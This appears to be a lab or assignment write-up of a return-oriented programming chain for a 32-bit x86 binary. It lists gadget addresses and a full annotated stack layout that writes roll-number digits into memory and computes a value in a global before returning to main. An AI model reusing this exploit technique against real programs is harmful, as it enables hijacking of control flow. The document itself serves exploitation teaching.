# ROP

## Below are the gadgets used to solve the problem

Gadgets we have used :

1) To fill values in registers
    (a) eax -  0x080b8376 : pop eax ; ret
    (b) ecx -  0x080dec61 : pop ecx ; ret
    (c) edx -  0x0805bf42 : pop edx ; ret
    (d) edi -  0x08048480 : pop edi ; ret
    (e) esi -  0x08048433 : pop esi ; ret
    
2) To write into an address :
    --> First fill eax and edx appropriately, then use 
    (a) 0x08065a43 : mov word ptr [edx], ax ; mov eax, edx ; ret     
    (b) 0x08054bfb : mov dword ptr [edx], eax ; ret
    
3) For multiplication :
    --> First fill ecx with correct address,make sure eax has correct value, then use
    0x08063258 : imul dword ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret
    
4) To store eax in a register, and then retrieve that value. ( We had to use eax for both mutiplication and store into address)
    --> Store in ebx, then load from ebx again. 
    0x080d64bb : push eax ; pop ebx ; or cl, byte ptr [esi] ; adc al, 0x41 ; ret 
    0x0804f44a : mov eax, ebx ; pop ebx ; ret







We have to fill the stack like this: with (ra) to main at top.


0x08048983   (ra) to main\ 
0x08065a43   (ra) corresponds to mov word ptr [edx], ax ; mov eax, edx ; ret\
0x00003332   (32 on top of stack)\
0x080b8376   (ra)corresponds to (pop eax;ret)\
0x080ea07e   (rollnumber2+6 on top of stack)\
0x0805bf42   (ra) corresponds to pop edx;ret\
0x08065a43   (ra) corresponds to mov word ptr [edx], ax ; mov eax, edx ; ret\
0x00004230   (B0 on top of stack)\
0x080b8376   (ra)corresponds to (pop eax;ret)\
0x080ea07c   (rollnumber2+4 on top of stack)\
0x0805bf42   (ra) corresponds to pop edx;ret\
0x08065a43   (ra) corresponds to mov word ptr [edx], ax ; mov eax, edx ; ret\
0x00003138   (18 on top of stack)\
0x080b8376   (ra)corresponds to (pop eax;ret)\
0x080ea07a   (rollnumber2+2 on top of stack)\
0x0805bf42   (ra) corresponds to pop edx;ret\
0x08065a43   (ra) corresponds to mov word ptr [edx], ax ; mov eax, edx ; ret\
0x00003536   (56 on top of stack)\
0x080b8376   (ra)corresponds to (pop eax;ret)\
0x080ea06e   (rollnumber1+6 on top of stack)\
0x0805bf42   (ra) corresponds to pop edx;ret\
0x08065a43   (ra) corresponds to mov word ptr [edx], ax ; mov eax, edx ; ret\
0x00004230   (B0 on top of stack)\
0x080b8376   (ra)corresponds to (pop eax;ret)\
0x080ea06c   (rollnumber1+4 on top of stack)\
0x0805bf42   (ra) corresponds to pop edx;ret\
0x08065a43   (ra) corresponds to mov word ptr [edx], ax ; mov eax, edx ; ret\
0x00003138   (18 on top of stack)\
0x080b8376   (ra)corresponds to (pop eax;ret)\
0x080ea06a   (rollnumber1+2 on top of stack)\
0x0805bf42   (ra) corresponds to pop edx;ret\

0x08054bfb   (ra) corresponds to mov dword ptr [edx], eax ; ret glb = 720\
0x080eba20   (address of glb)\
0x0805bf42   (ra) corresponds to pop edx;ret edx = glb\
0x00000000   (random value on top of stack)\
0x08063258   (ra) corresponds to  imul dword ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret   eax = 720\
0x00000000   (random value on top of stack)\
0x0804f44a   (ra) corresponds to mov eax, ebx ; pop ebx ; ret  #eax = 360\
0x08054bfb   (ra) corresponds to # mov dword ptr [edx], eax ; ret   glb = 2\
0x080eba20   (address of glb)\
0x0805bf42   (ra) corresponds to # pop edx;ret   // edx = &glb \
0x00000002   (2 on top stack) \
0x080b8376   (ra) corresponds to pop eax;ret # eax= 2 \
0x080eba20   (address of glb)\
0x080dec61   (ra) corresponds to pop ecx;ret #ecx = &glb\
0x080d64bb   (ra) corresponds to push eax ; pop ebx ; or cl, byte ptr [esi] ; adc al, 0x41 ; ret ebx = 360\
0x00000000   (random value on top of stack)\
0x08063258   (ra) corresponds to  imul dword ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret   eax = 360\
0x00000000   (random value on top of stack)\
0x0804f44a   (ra) corresponds to mov eax, ebx ; pop ebx ; ret  #eax = 120\
0x08054bfb   (ra) corresponds to # mov dword ptr [edx], eax ; ret   glb = 3\
0x080eba20   (address of glb)\
0x0805bf42   (ra) corresponds to # pop edx;ret   // edx = &glb\
0x00000003   (3 on top stack)\
0x080b8376   (ra) corresponds to pop eax;ret # eax= 3\
0x080eba20   (address of glb)\
0x080dec61   (ra) corresponds to pop ecx;ret #ecx = &glb\
0x080d64bb   (ra) corresponds to push eax ; pop ebx ; or cl, byte ptr [esi] ; adc al, 0x41 ; ret ebx = 120\
0x00000000   (random value on top of stack)\
0x08063258   (ra) corresponds to  imul dword ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret   eax = 120\
0x00000000   (random value on top of stack)\
0x0804f44a   (ra) corresponds to mov eax, ebx ; pop ebx ; ret  #eax = 30\
0x08054bfb   (ra) corresponds to # mov dword ptr [edx], eax ; ret   glb = 4\
0x080eba20   (address of glb)\
0x0805bf42   (ra) corresponds to # pop edx;ret   // edx = &glb\
0x00000004   (4 on top stack)\
0x080b8376   (ra) corresponds to pop eax;ret # eax= 4\
0x080eba20   (address of glb)\
0x080dec61   (ra) corresponds to pop ecx;ret #ecx = &glb\
0x080d64bb   (ra) corresponds to push eax ; pop ebx ; or cl, byte ptr [esi] ; adc al, 0x41 ; ret ebx = 30\
0x00000000   (random value on top of stack)\
0x08063258   (ra) corresponds to  imul dword ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret   eax = 30\
0x00000006   (6 on top of stack)\
0x080b8376   (ra) corresponds to #pop eax;ret    eax = 6\
0x08054bfb   (ra) corresponds to # mov dword ptr [edx], eax ; ret   glb = 5 \
0x080eba20   (address of glb on top of stack)\
0x0805bf42   (ra) corresponds to # pop edx;ret   // edx = &glb\
0x00000005   (5 on top of stack)\
0x080b8376   (ra) corresponds to #pop eax ; ret \
0x080eba20   (address of glb)\
0x080dec61   (ra) corresponds to  # pop ecx;ret  // ecx = &glb\
0xffffd000   (some acccessible stack address)\
0x08048480   (ra) corresponds to  pop edi;ret\
0xffffd05e   (some acccessible stack address)\
0x08048433   (ra) corresponds to pop esi ; ret















